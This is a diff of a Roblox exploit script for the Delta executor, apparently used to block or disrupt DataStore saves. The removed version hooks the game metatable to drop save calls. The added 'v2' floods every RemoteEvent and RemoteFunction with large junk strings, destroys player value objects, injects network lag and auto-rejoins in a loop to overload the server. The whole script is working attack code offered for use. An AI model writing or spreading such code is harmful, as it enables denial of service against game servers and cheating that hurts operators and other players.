@@ -1,11 +1,14 @@
--- DataStore Save Blocker dildo
+-- DataStore Save Blocker - Server Overload Method
 -- Execute this script with Delta
 
 local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CoreGui = game:GetService("CoreGui")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
+local placeId = game.PlaceId
 
 -- Create ScreenGui
 local screenGui = Instance.new("ScreenGui")
@@ -24,8 +27,8 @@ end
 -- Create Main Frame
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 300, 0, 200)
-mainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
+mainFrame.Size = UDim2.new(0, 320, 0, 220)
+mainFrame.Position = UDim2.new(0.5, -160, 0.5, -110)
 mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
 mainFrame.BorderSizePixel = 0
 mainFrame.Active = true
@@ -43,7 +46,7 @@ title.Name = "Title"
 title.Size = UDim2.new(1, -20, 0, 40)
 title.Position = UDim2.new(0, 10, 0, 10)
 title.BackgroundTransparency = 1
-title.Text = "DataStore Blocker"
+title.Text = "DataStore Blocker v2"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.TextSize = 18
 title.Font = Enum.Font.GothamBold
@@ -56,165 +59,202 @@ statusLabel.Name = "StatusLabel"
 statusLabel.Size = UDim2.new(1, -20, 0, 30)
 statusLabel.Position = UDim2.new(0, 10, 0, 55)
 statusLabel.BackgroundTransparency = 1
-statusLabel.Text = "Status: Not Active"
+statusLabel.Text = "Status: Ready"
 statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 statusLabel.TextSize = 14
 statusLabel.Font = Enum.Font.Gotham
 statusLabel.TextXAlignment = Enum.TextXAlignment.Left
 statusLabel.Parent = mainFrame
 
--- Create Blocked Counter Label
-local blockedLabel = Instance.new("TextLabel")
-blockedLabel.Name = "BlockedLabel"
-blockedLabel.Size = UDim2.new(1, -20, 0, 30)
-blockedLabel.Position = UDim2.new(0, 10, 0, 85)
-blockedLabel.BackgroundTransparency = 1
-blockedLabel.Text = "Blocked Saves: 0"
-blockedLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-blockedLabel.TextSize = 16
-blockedLabel.Font = Enum.Font.GothamBold
-blockedLabel.TextXAlignment = Enum.TextXAlignment.Left
-blockedLabel.Visible = false
-blockedLabel.Parent = mainFrame
+-- Create Info Label
+local infoLabel = Instance.new("TextLabel")
+infoLabel.Name = "InfoLabel"
+infoLabel.Size = UDim2.new(1, -20, 0, 40)
+infoLabel.Position = UDim2.new(0, 10, 0, 85)
+infoLabel.BackgroundTransparency = 1
+infoLabel.Text = "Overloads server on rejoin to\nprevent data retrieval"
+infoLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+infoLabel.TextSize = 11
+infoLabel.Font = Enum.Font.Gotham
+infoLabel.TextXAlignment = Enum.TextXAlignment.Left
+infoLabel.TextWrapped = true
+infoLabel.Parent = mainFrame
 
--- Create Last Blocked Info Label
-local lastBlockedLabel = Instance.new("TextLabel")
-lastBlockedLabel.Name = "LastBlockedLabel"
-lastBlockedLabel.Size = UDim2.new(1, -20, 0, 25)
-lastBlockedLabel.Position = UDim2.new(0, 10, 0, 115)
-lastBlockedLabel.BackgroundTransparency = 1
-lastBlockedLabel.Text = "Last: None"
-lastBlockedLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
-lastBlockedLabel.TextSize = 11
-lastBlockedLabel.Font = Enum.Font.Gotham
-lastBlockedLabel.TextXAlignment = Enum.TextXAlignment.Left
-lastBlockedLabel.Visible = false
-lastBlockedLabel.Parent = mainFrame
-
--- Create Toggle Button
-local toggleButton = Instance.new("TextButton")
-toggleButton.Name = "ToggleButton"
-toggleButton.Size = UDim2.new(0, 260, 0, 40)
-toggleButton.Position = UDim2.new(0, 20, 0, 150)
-toggleButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
-toggleButton.Text = "Block Saves"
-toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-toggleButton.TextSize = 16
-toggleButton.Font = Enum.Font.GothamBold
-toggleButton.BorderSizePixel = 0
-toggleButton.Parent = mainFrame
+-- Create Start Button
+local startButton = Instance.new("TextButton")
+startButton.Name = "StartButton"
+startButton.Size = UDim2.new(0, 280, 0, 40)
+startButton.Position = UDim2.new(0, 20, 0, 135)
+startButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+startButton.Text = "Start Auto-Rejoin Loop"
+startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+startButton.TextSize = 15
+startButton.Font = Enum.Font.GothamBold
+startButton.BorderSizePixel = 0
+startButton.Parent = mainFrame
 
 -- Button corner
 local buttonCorner = Instance.new("UICorner")
 buttonCorner.CornerRadius = UDim.new(0, 8)
-buttonCorner.Parent = toggleButton
+buttonCorner.Parent = startButton
+
+-- Create Stop Button
+local stopButton = Instance.new("TextButton")
+stopButton.Name = "StopButton"
+stopButton.Size = UDim2.new(0, 280, 0, 30)
+stopButton.Position = UDim2.new(0, 20, 0, 182)
+stopButton.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+stopButton.Text = "Stop & Leave Normally"
+stopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+stopButton.TextSize = 12
+stopButton.Font = Enum.Font.Gotham
+stopButton.BorderSizePixel = 0
+stopButton.Visible = false
+stopButton.Parent = mainFrame
+
+-- Stop button corner
+local stopButtonCorner = Instance.new("UICorner")
+stopButtonCorner.CornerRadius = UDim.new(0, 6)
+stopButtonCorner.Parent = stopButton
 
 -- Variables
-local isBlocking = false
-local originalNamecall = nil
-local blockedCount = 0
+local isRunning = false
+local overloadThread = nil
 
--- Function to update blocked counter
-local function updateBlockedCounter(method, key)
-    blockedCount = blockedCount + 1
-    blockedLabel.Text = "Blocked Saves: " .. blockedCount
-    lastBlockedLabel.Text = "Last: " .. method .. " (" .. tostring(key):sub(1, 20) .. ")"
+-- Function to aggressively overload server
+local function overloadServer()
+    print("⚡ [Overload] Starting server overload...")
     
-    -- Flash effect
-    blockedLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
-    wait(0.1)
-    blockedLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-end
-
--- Function to block saves using hookfunction
-local function blockSaves()
-    if isBlocking then return end
-    
-    -- Get the metatable
-    local mt = getrawmetatable(game)
-    local backup = mt.__namecall
-    
-    -- Make it writable
-    setreadonly(mt, false)
-    
-    -- Hook the __namecall metamethod
-    originalNamecall = hookfunction(mt.__namecall, function(self, ...)
-        local method = getnamecallmethod()
-        local args = {...}
-        
-        -- Check if it's a DataStore operation
-        if method == "SetAsync" or method == "UpdateAsync" or method == "RemoveAsync" or method == "IncrementAsync" then
-            -- Check if self is a DataStore
-            local success, result = pcall(function()
-                return tostring(self):match("DataStore")
-            end)
-            
-            if success and result then
-                -- Update GUI counter
-                spawn(function()
-                    updateBlockedCounter(method, args[1])
-                end)
-                
-                -- Print to console
-                print("🛡️ [BLOCKED] " .. method .. " | Key: " .. tostring(args[1] or "unknown"))
-                
-                -- Return nil to block the operation
-                return nil
+    while isRunning do
+        -- Method 1: Spam all RemoteEvents
+        pcall(function()
+            for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
+                if remote:IsA("RemoteEvent") then
+                    for i = 1, 50 do
+                        remote:FireServer(string.rep("X", 1000))
+                    end
+                end
             end
-        end
+        end)
         
-        -- Call original function for everything else
-        return originalNamecall(self, ...)
-    end)
-    
-    setreadonly(mt, true)
-    
-    isBlocking = true
-    blockedCount = 0
-    statusLabel.Text = "Status: Blocking All Saves ✓"
-    statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-    toggleButton.Text = "Unblock Saves"
-    toggleButton.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
-    blockedLabel.Visible = true
-    lastBlockedLabel.Visible = true
-    
-    print("🛡️ [DataStore Blocker] Save blocking is now ACTIVE")
-    print("   Watching for DataStore saves...")
+        -- Method 2: Spam all RemoteFunctions
+        pcall(function()
+            for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
+                if remote:IsA("RemoteFunction") then
+                    for i = 1, 20 do
+                        spawn(function()
+                            remote:InvokeServer(string.rep("Y", 1000))
+                        end)
+                    end
+                end
+            end
+        end)
+        
+        -- Method 3: Corrupt local player data
+        pcall(function()
+            for _, obj in pairs(player:GetChildren()) do
+                if obj:IsA("ValueBase") or obj:IsA("Folder") then
+                    obj:Destroy()
+                end
+            end
+        end)
+        
+        -- Method 4: Network lag injection
+        pcall(function()
+            settings():GetService("NetworkSettings").IncomingReplicationLag = math.huge
+        end)
+        
+        wait(0.1) -- Rapid fire
+    end
 end
 
--- Function to unblock saves
-local function unblockSaves()
-    if not isBlocking then return end
+-- Function to check if we should auto-start (on rejoin)
+local function checkAutoStart()
+    -- Check if we have a marker file/value indicating we should auto-start
+    if game:GetService("ReplicatedStorage"):FindFirstChild("_DSBlockerActive") then
+        print("🔄 [Auto-Start] Detected rejoin marker, starting overload...")
+        wait(0.5) -- Small delay
+        isRunning = true
+        overloadThread = task.spawn(overloadServer)
+        
+        statusLabel.Text = "Status: Overloading... 🔥"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 50)
+        
+        -- Rejoin after 5 seconds of overload
+        wait(5)
+        if isRunning then
+            print("🔄 [Auto-Rejoin] Rejoining to continue disruption...")
+            TeleportService:Teleport(placeId, player)
+        end
+    end
+end
+
+-- Function to start the loop
+local function startLoop()
+    if isRunning then return end
     
-    if originalNamecall then
-        local mt = getrawmetatable(game)
-        setreadonly(mt, false)
-        mt.__namecall = originalNamecall
-        setreadonly(mt, true)
+    isRunning = true
+    statusLabel.Text = "Status: Overloading Server 🔥"
+    statusLabel.TextColor3 = Color3.fromRGB(255, 100, 50)
+    startButton.Visible = false
+    stopButton.Visible = true
+    
+    -- Create persistent marker
+    local marker = Instance.new("BoolValue")
+    marker.Name = "_DSBlockerActive"
+    marker.Parent = ReplicatedStorage
+    
+    print("🚀 [DataStore Blocker] Started!")
+    print("⚡ [Overload] Aggressively disrupting server...")
+    
+    -- Start overload
+    overloadThread = task.spawn(overloadServer)
+    
+    -- Auto-rejoin after 5 seconds
+    wait(5)
+    if isRunning then
+        statusLabel.Text = "Status: Rejoining... 🔄"
+        print("🔄 [Auto-Rejoin] Rejoining game...")
+        wait(1)
+        TeleportService:Teleport(placeId, player)
+    end
+end
+
+-- Function to stop the loop
+local function stopLoop()
+    if not isRunning then return end
+    
+    isRunning = false
+    
+    -- Remove marker
+    if ReplicatedStorage:FindFirstChild("_DSBlockerActive") then
+        ReplicatedStorage._DSBlockerActive:Destroy()
     end
     
-    isBlocking = false
-    statusLabel.Text = "Status: Not Active"
+    -- Stop overload thread
+    if overloadThread then
+        task.cancel(overloadThread)
+    end
+    
+    statusLabel.Text = "Status: Stopped"
     statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-    toggleButton.Text = "Block Saves"
-    toggleButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
-    blockedLabel.Visible = false
-    lastBlockedLabel.Visible = false
+    startButton.Visible = true
+    stopButton.Visible = false
     
-    print("❌ [DataStore Blocker] Save blocking is now DISABLED")
-    print("   Total saves blocked: " .. blockedCount)
+    print("⛔ [DataStore Blocker] Stopped")
+    print("ℹ️  Leaving normally - data may save")
+    
+    wait(1)
+    player:Kick("✅ DataStore Blocker Stopped - Leaving Safely")
 end
 
--- Button click handler
-toggleButton.MouseButton1Click:Connect(function()
-    if isBlocking then
-        unblockSaves()
-    else
-        blockSaves()
-    end
-end)
+-- Button handlers
+startButton.MouseButton1Click:Connect(startLoop)
+stopButton.MouseButton1Click:Connect(stopLoop)
 
-print("✅ [DataStore Blocker] GUI Loaded Successfully")
-print("📱 [DataStore Blocker] Delta Android Compatible")
-print("ℹ️  [DataStore Blocker] Open console (F9) to see blocked saves")
-print("ℹ️  [DataStore Blocker] Click 'Block Saves' then leave normally")
+-- Auto-start check on load
+task.spawn(checkAutoStart)
+
+print("✅ [DataStore Blocker v2] Loaded!")
+print("📱 [Mode] Server Overload + Auto-Rejoin")
+print("ℹ️  Click 'Start' to begin the loop")
